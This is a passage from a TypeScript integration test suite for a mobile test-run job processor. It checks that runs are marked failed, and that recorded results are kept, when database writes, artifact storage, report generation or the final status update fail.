          const jobRes = await pool.query("SELECT status, error_message FROM background_jobs WHERE id = $1", [job.id]);
          expect(jobRes.rows[0].status).toBe("failed");
          expect(jobRes.rows[0].error_message).toContain("Simulated database write error on test_results insert");
        } finally {
          querySpy.mockRestore();
          execSpy.mockRestore();
          await pool.query("DELETE FROM test_cases WHERE id = $1", [tcId]);
        }
      });

      it("finalizes test_runs to failed and preserves results on artifact metadata recording failure", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        const tcId = (await import("node:crypto")).randomUUID();
        const deviceUdid = `art-fail-${(await import("node:crypto")).randomUUID().slice(0, 8)}`;

        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type) VALUES ($1, $2, 'running', 'mobile')`,
          [runId, testProjectId],
        );
        await pool.query(
          `INSERT INTO test_cases (id, project_id, title, steps, review_status)
           VALUES ($1, $2, 'Artifact Test Case', $3::jsonb, 'approved')`,
          [tcId, testProjectId, JSON.stringify(["app launch com.android.settings"])],
        );
        await pool.query(
          `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
           VALUES (gen_random_uuid(), $1, 'Artifact Fail Device', 'android', $2, 'http://127.0.0.1:4723', true)`,
          [testProjectId, deviceUdid],
        );

        const execSpy = vi.spyOn(executionManager, "runMobileTestWithRetries").mockResolvedValueOnce({
          status: "passed",
          durationMs: 100,
          screenshotPath: "runs/mock/screenshot.png",
          errorMessage: null,
          deviceInfo: { platform: "android", deviceName: deviceUdid, osVersion: "Android", udid: deviceUdid },
          flaky: false,
          retryCount: 0,
          attempts: [],
          stepResults: [],
          evidence: { status: "passed", durationMs: 100, failureStep: null, failureStepIndex: null, errorMessage: null, screenshotPath: "runs/mock/screenshot.png", deviceLogs: [], crashEvidence: { crashed: false }, stepResults: [], deviceInfo: { platform: "android", deviceName: deviceUdid, osVersion: "Android", udid: deviceUdid }, evidencePath: null },
        } as any);

        const artifactSpy = vi.spyOn(storageService, "recordStoredArtifact")
          .mockRejectedValueOnce(new Error("Simulated storage service permission denied"));

        try {
          const job = await enqueueJob({
            projectId: testProjectId,
            queueName: "mobile_tests",
            jobType: "mobile_execution",
            maxRetries: 0,
            payload: {
              runId,
              projectId: testProjectId,
              testCaseId: tcId,
              deviceUdid,
              retries: 0,
            },
            createdBy: adminUserId,
          });

          const success = await processJob(job.id);
          expect(success).toBe(false);

          const runRes = await pool.query("SELECT status, finished_at FROM test_runs WHERE id = $1", [runId]);
          expect(runRes.rows[0].status).toBe("failed");
          expect(runRes.rows[0].finished_at).not.toBeNull();

          // Verify test result was recorded and preserved
          const resultsRes = await pool.query("SELECT status FROM test_results WHERE run_id = $1", [runId]);
          expect(resultsRes.rowCount).toBe(1);
          expect(resultsRes.rows[0].status).toBe("passed");

          const jobRes = await pool.query("SELECT status, error_message FROM background_jobs WHERE id = $1", [job.id]);
          expect(jobRes.rows[0].status).toBe("failed");
          expect(jobRes.rows[0].error_message).toContain("Simulated storage service permission denied");
        } finally {
          artifactSpy.mockRestore();
          execSpy.mockRestore();
          await pool.query("DELETE FROM test_cases WHERE id = $1", [tcId]);
        }
      });

      it("finalizes test_runs to failed and preserves recorded results on report generation failure", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        const tcId = (await import("node:crypto")).randomUUID();
        const deviceUdid = `report-fail-${(await import("node:crypto")).randomUUID().slice(0, 8)}`;

        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type) VALUES ($1, $2, 'running', 'mobile')`,
          [runId, testProjectId],
        );
        await pool.query(
          `INSERT INTO test_cases (id, project_id, title, steps, review_status)
           VALUES ($1, $2, 'Report Fail Case', $3::jsonb, 'approved')`,
          [tcId, testProjectId, JSON.stringify(["app launch com.android.settings"])],
        );
        await pool.query(
          `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
           VALUES (gen_random_uuid(), $1, 'Report Fail Device', 'android', $2, 'http://127.0.0.1:4723', true)`,
          [testProjectId, deviceUdid],
        );

        const execSpy = vi.spyOn(executionManager, "runMobileTestWithRetries").mockResolvedValueOnce({
          status: "passed",
          durationMs: 150,
          screenshotPath: null,
          errorMessage: null,
          deviceInfo: { platform: "android", deviceName: deviceUdid, osVersion: "Android", udid: deviceUdid },
          flaky: false,
          retryCount: 0,
          attempts: [],
          stepResults: [],
          evidence: { status: "passed", durationMs: 150, failureStep: null, failureStepIndex: null, errorMessage: null, screenshotPath: null, deviceLogs: [], crashEvidence: { crashed: false }, stepResults: [], deviceInfo: { platform: "android", deviceName: deviceUdid, osVersion: "Android", udid: deviceUdid }, evidencePath: null },
        } as any);

        const reportSpy = vi.spyOn(runReportService, "writeRunReport")
          .mockRejectedValueOnce(new Error("Disk quota exceeded generating report"));

        try {
          const job = await enqueueJob({
            projectId: testProjectId,
            queueName: "mobile_tests",
            jobType: "mobile_execution",
            maxRetries: 0,
            payload: {
              runId,
              projectId: testProjectId,
              testCaseId: tcId,
              deviceUdid,
              retries: 0,
            },
            createdBy: adminUserId,
          });

          const success = await processJob(job.id);
          expect(success).toBe(false);

          // Must be marked failed, NOT running or passed
          const runRes = await pool.query("SELECT status, finished_at, total_count FROM test_runs WHERE id = $1", [runId]);
          expect(runRes.rows[0].status).toBe("failed");
          expect(runRes.rows[0].finished_at).not.toBeNull();
          expect(runRes.rows[0].total_count).toBe(1);

          // Results recorded before report failure are preserved
          const resultsRes = await pool.query("SELECT status FROM test_results WHERE run_id = $1", [runId]);
          expect(resultsRes.rowCount).toBe(1);
          expect(resultsRes.rows[0].status).toBe("passed");

          const jobRes = await pool.query("SELECT status, error_message FROM background_jobs WHERE id = $1", [job.id]);
          expect(jobRes.rows[0].status).toBe("failed");
          expect(jobRes.rows[0].error_message).toContain("Disk quota exceeded generating report");
        } finally {
          reportSpy.mockRestore();
          execSpy.mockRestore();
          await pool.query("DELETE FROM test_cases WHERE id = $1", [tcId]);
        }
      });
    });

    describe("Finalization Flag Ordering and Database Finalization Verification", () => {
      it("finalizeTestRunDb updates a running run and returns true", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type) VALUES ($1, $2, 'running', 'mobile')`,
          [runId, testProjectId],
        );

        const finalized = await finalizeTestRunDb(runId, "passed", {
          flakyCount: 0,
          inconclusiveCount: 0,
          skippedCount: 0,
          totalCount: 5,
        });

        expect(finalized).toBe(true);
        const res = await pool.query("SELECT status, total_count, finished_at FROM test_runs WHERE id = $1", [runId]);
        expect(res.rows[0].status).toBe("passed");
        expect(res.rows[0].total_count).toBe(5);
        expect(res.rows[0].finished_at).not.toBeNull();
      });

      it("zero-row update with the same existing terminal status returns true", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type, total_count) VALUES ($1, $2, 'failed', 'mobile', 3)`,
          [runId, testProjectId],
        );

        const finalized = await finalizeTestRunDb(runId, "failed", {
          flakyCount: 0,
          inconclusiveCount: 0,
          skippedCount: 0,
          totalCount: 10,
        });

        expect(finalized).toBe(true);
        const res = await pool.query("SELECT status, total_count FROM test_runs WHERE id = $1", [runId]);
        expect(res.rows[0].status).toBe("failed");
        expect(res.rows[0].total_count).toBe(3);
      });

      it("zero-row update with a different terminal status returns false and never overwrites terminal status", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type, total_count) VALUES ($1, $2, 'failed', 'mobile', 3)`,
          [runId, testProjectId],
        );

        const finalized = await finalizeTestRunDb(runId, "passed", {
          flakyCount: 0,
          inconclusiveCount: 0,
          skippedCount: 0,
          totalCount: 10,
        });

        expect(finalized).toBe(false);
        const res = await pool.query("SELECT status, total_count FROM test_runs WHERE id = $1", [runId]);
        expect(res.rows[0].status).toBe("failed");
        expect(res.rows[0].total_count).toBe(3);
      });

      it("missing run returns false", async () => {
        const nonExistentRunId = (await import("node:crypto")).randomUUID();
        const finalized = await finalizeTestRunDb(nonExistentRunId, "passed", {
          flakyCount: 0,
          inconclusiveCount: 0,
          skippedCount: 0,
          totalCount: 1,
        });

        expect(finalized).toBe(false);
      });

      it("success path does not return success when finalization returns false", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        const tcId = (await import("node:crypto")).randomUUID();
        const deviceUdid = `succ-fail-${(await import("node:crypto")).randomUUID().slice(0, 8)}`;

        // Seed test_run with an existing different terminal status ('failed')
        // so that finalizeTestRunDb(runId, 'passed', ...) affects 0 rows and returns false
        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type) VALUES ($1, $2, 'failed', 'mobile')`,
          [runId, testProjectId],
        );
        await pool.query(
          `INSERT INTO test_cases (id, project_id, title, steps, review_status)
           VALUES ($1, $2, 'Success Path Finalize Fail Case', $3::jsonb, 'approved')`,
          [tcId, testProjectId, JSON.stringify(["app launch com.android.settings"])],
        );
        await pool.query(
          `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
           VALUES (gen_random_uuid(), $1, 'Success Finalize Device', 'android', $2, 'http://127.0.0.1:4723', true)`,
          [testProjectId, deviceUdid],
        );

        const execSpy = vi.spyOn(executionManager, "runMobileTestWithRetries").mockResolvedValueOnce({
          status: "passed",
          durationMs: 100,
          screenshotPath: null,
          errorMessage: null,
          deviceInfo: { platform: "android", deviceName: deviceUdid, osVersion: "Android", udid: deviceUdid },
          flaky: false,
          retryCount: 0,
          attempts: [],
          stepResults: [],
          evidence: {
            status: "passed",
            durationMs: 100,
            failureStep: null,
            failureStepIndex: null,
            errorMessage: null,
            screenshotPath: null,
            deviceLogs: [],
            crashEvidence: { crashed: false },
            stepResults: [],
            deviceInfo: { platform: "android", deviceName: deviceUdid, osVersion: "Android", udid: deviceUdid },
            evidencePath: null,
          },
        } as any);

        const reportSpy = vi.spyOn(runReportService, "writeRunReport").mockResolvedValue({} as any);

        try {
          const job = await enqueueJob({
            projectId: testProjectId,
            queueName: "mobile_tests",
            jobType: "mobile_execution",
            maxRetries: 0,
            payload: {
              runId,
              projectId: testProjectId,
              testCaseId: tcId,
              deviceUdid,
              retries: 0,
            },
            createdBy: adminUserId,
          });

          const success = await processJob(job.id);
          expect(success).toBe(false);

          const jobRes = await pool.query("SELECT status, error_message FROM background_jobs WHERE id = $1", [job.id]);
          expect(jobRes.rows[0].status).toBe("failed");
          expect(jobRes.rows[0].error_message).toContain("Failed to finalize test run");
          expect(jobRes.rows[0].error_message).toContain("status passed");

          // Terminal status in test_runs was NOT overwritten
          const runRes = await pool.query("SELECT status FROM test_runs WHERE id = $1", [runId]);
          expect(runRes.rows[0].status).toBe("failed");
        } finally {
          reportSpy.mockRestore();
          execSpy.mockRestore();
          await pool.query("DELETE FROM test_cases WHERE id = $1", [tcId]);
        }
      });

      it("empty-test-case path does not return skipped when finalization returns false", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        const deviceUdid = `empty-fail-${(await import("node:crypto")).randomUUID().slice(0, 8)}`;

        // Seed test_run with an existing different terminal status ('failed')
        // so that finalizeTestRunDb(runId, 'skipped', ...) affects 0 rows and returns false
        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type) VALUES ($1, $2, 'failed', 'mobile')`,
          [runId, testProjectId],
        );
        await pool.query(
          `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
           VALUES (gen_random_uuid(), $1, 'Empty Finalize Device', 'android', $2, 'http://127.0.0.1:4723', true)`,
          [testProjectId, deviceUdid],
        );

        const nonExistentTcId = (await import("node:crypto")).randomUUID();
        const reportSpy = vi.spyOn(runReportService, "writeRunReport").mockResolvedValue({} as any);

        try {
          const job = await enqueueJob({
            projectId: testProjectId,
            queueName: "mobile_tests",
            jobType: "mobile_execution",
            maxRetries: 0,
            payload: {
              runId,
              projectId: testProjectId,
              testCaseId: nonExistentTcId,
              deviceUdid,
              retries: 0,
            },
            createdBy: adminUserId,
          });

          const success = await processJob(job.id);
          expect(success).toBe(false);

          const jobRes = await pool.query("SELECT status, error_message FROM background_jobs WHERE id = $1", [job.id]);
          expect(jobRes.rows[0].status).toBe("failed");
          expect(jobRes.rows[0].error_message).toContain("Failed to finalize test run");
          expect(jobRes.rows[0].error_message).toContain("as skipped");

          // Terminal status in test_runs was NOT overwritten
          const runRes = await pool.query("SELECT status FROM test_runs WHERE id = $1", [runId]);
          expect(runRes.rows[0].status).toBe("failed");
        } finally {
          reportSpy.mockRestore();
        }
      });

      it("does not prematurely mark run finalized when final database update throws in execution path", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        const tcId = (await import("node:crypto")).randomUUID();
        const deviceUdid = `flag-fail-${(await import("node:crypto")).randomUUID().slice(0, 8)}`;

        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type) VALUES ($1, $2, 'running', 'mobile')`,
          [runId, testProjectId],
        );
        await pool.query(
          `INSERT INTO test_cases (id, project_id, title, steps, review_status)
           VALUES ($1, $2, 'Flag Ordering Case', $3::jsonb, 'approved')`,
          [tcId, testProjectId, JSON.stringify(["app launch com.android.settings"])],
        );
        await pool.query(
          `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
           VALUES (gen_random_uuid(), $1, 'Flag Fail Device', 'android', $2, 'http://127.0.0.1:4723', true)`,
          [testProjectId, deviceUdid],
        );

        const execSpy = vi.spyOn(executionManager, "runMobileTestWithRetries").mockResolvedValueOnce({
          status: "passed",
          durationMs: 120,
          screenshotPath: null,
          errorMessage: null,
          deviceInfo: { platform: "android", deviceName: deviceUdid, osVersion: "Android", udid: deviceUdid },
          flaky: false,
          retryCount: 0,
          attempts: [],
          stepResults: [],
          evidence: {
            status: "passed",
            durationMs: 120,
            failureStep: null,
            failureStepIndex: null,
            errorMessage: null,
            screenshotPath: null,
            deviceLogs: [],
            crashEvidence: { crashed: false },
            stepResults: [],
            deviceInfo: { platform: "android", deviceName: deviceUdid, osVersion: "Android", udid: deviceUdid },
            evidencePath: null,
          },
        } as any);

        const reportSpy = vi.spyOn(runReportService, "writeRunReport").mockResolvedValue({} as any);

        let updateCount = 0;
        const originalQuery = pool.query.bind(pool);
        const querySpy = vi.spyOn(pool, "query").mockImplementation(async (text: any, params: any) => {
          if (typeof text === "string" && text.includes("UPDATE test_runs") && text.includes("status NOT IN")) {
            updateCount++;
            if (updateCount === 1) {
              throw new Error("Simulated connection timeout during final status update");
            }
          }
          return originalQuery(text, params);
        });

        try {
          const job = await enqueueJob({
            projectId: testProjectId,
            queueName: "mobile_tests",
            jobType: "mobile_execution",
            maxRetries: 0,
            payload: {
              runId,
              projectId: testProjectId,
              testCaseId: tcId,
              deviceUdid,
              retries: 0,
            },
            createdBy: adminUserId,
          });

          const success = await processJob(job.id);
          expect(success).toBe(false);

          const runRes = await pool.query("SELECT status, finished_at FROM test_runs WHERE id = $1", [runId]);
          expect(runRes.rows[0].status).toBe("failed");
          expect(runRes.rows[0].finished_at).not.toBeNull();

          const jobRes = await pool.query("SELECT status, error_message FROM background_jobs WHERE id = $1", [job.id]);
          expect(jobRes.rows[0].status).toBe("failed");
          expect(jobRes.rows[0].error_message).toContain("Simulated connection timeout during final status update");
        } finally {
          reportSpy.mockRestore();
          querySpy.mockRestore();
          execSpy.mockRestore();
          await pool.query("DELETE FROM test_cases WHERE id = $1", [tcId]);
        }
      });

      it("logs secondary error clearly without swallowing primary error when database is completely down during failure finalization", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        const tcId = (await import("node:crypto")).randomUUID();
        const deviceUdid = `sec-err-${(await import("node:crypto")).randomUUID().slice(0, 8)}`;

        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type) VALUES ($1, $2, 'running', 'mobile')`,
          [runId, testProjectId],
        );
        await pool.query(
          `INSERT INTO test_cases (id, project_id, title, steps, review_status)
           VALUES ($1, $2, 'Secondary Error Case', $3::jsonb, 'approved')`,
          [tcId, testProjectId, JSON.stringify(["app launch com.android.settings"])],
        );
        await pool.query(
          `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
           VALUES (gen_random_uuid(), $1, 'Secondary Err Device', 'android', $2, 'http://127.0.0.1:4723', true)`,
          [testProjectId, deviceUdid],
        );

        const execSpy = vi.spyOn(executionManager, "runMobileTestWithRetries").mockResolvedValueOnce({
          status: "passed",
          durationMs: 120,
          screenshotPath: null,
          errorMessage: null,
          deviceInfo: { platform: "android", deviceName: deviceUdid, osVersion: "Android", udid: deviceUdid },
          flaky: false,
          retryCount: 0,
          attempts: [],
          stepResults: [],
          evidence: {
            status: "passed",
            durationMs: 120,
            failureStep: null,
            failureStepIndex: null,
            errorMessage: null,
            screenshotPath: null,
            deviceLogs: [],
            crashEvidence: { crashed: false },
            stepResults: [],
            deviceInfo: { platform: "android", deviceName: deviceUdid, osVersion: "Android", udid: deviceUdid },
            evidencePath: null,
          },
        } as any);

        const reportSpy = vi.spyOn(runReportService, "writeRunReport").mockResolvedValue({} as any);
        const loggerErrorSpy = vi.spyOn(logger, "error");

        const originalQuery = pool.query.bind(pool);
        const querySpy = vi.spyOn(pool, "query").mockImplementation(async (text: any, params: any) => {
          if (typeof text === "string" && text.includes("UPDATE test_runs") && text.includes("status NOT IN")) {
            throw new Error("Fatal: database connection refused");
          }
          return originalQuery(text, params);
        });

        try {
          const job = await enqueueJob({
            projectId: testProjectId,
            queueName: "mobile_tests",
            jobType: "mobile_execution",
            maxRetries: 0,
            payload: {
              runId,
              projectId: testProjectId,
              testCaseId: tcId,
              deviceUdid,
              retries: 0,
            },
            createdBy: adminUserId,
          });

          const success = await processJob(job.id);
          expect(success).toBe(false);

          const jobRes = await pool.query("SELECT status, error_message FROM background_jobs WHERE id = $1", [job.id]);
          expect(jobRes.rows[0].status).toBe("failed");
          expect(jobRes.rows[0].error_message).toContain("Fatal: database connection refused");

          const secondaryLogs = loggerErrorSpy.mock.calls.filter((call) =>
            typeof call[0] === "string" && call[0].includes("Failed to update test_runs status for failed run"),
          );
          expect(secondaryLogs.length).toBeGreaterThanOrEqual(1);
        } finally {
          reportSpy.mockRestore();
          loggerErrorSpy.mockRestore();
          querySpy.mockRestore();
          execSpy.mockRestore();
          await pool.query("DELETE FROM test_cases WHERE id = $1", [tcId]);
        }
      });
    });
  });
});
